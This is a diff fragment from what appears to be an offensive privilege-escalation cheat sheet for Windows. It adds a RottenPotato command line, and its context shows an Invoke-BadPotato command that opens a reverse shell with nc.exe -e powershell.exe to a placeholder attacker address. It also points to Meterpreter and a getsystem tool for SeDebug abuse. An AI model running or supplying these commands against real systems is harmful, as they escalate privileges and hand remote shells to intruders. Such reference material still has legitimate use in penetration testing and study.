@@ -124,6 +124,10 @@ Run the script to get system
 
     Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe ATTACK_IP PORT"
 
+## Tool: RottenPotato
+
+    RottenPotato.exe -r -c "cmd.exe"
+
 ## SeDebug Privilege
 
 ### Tools: Meterpreter, https://github.com/decoder-it/psgetsystem
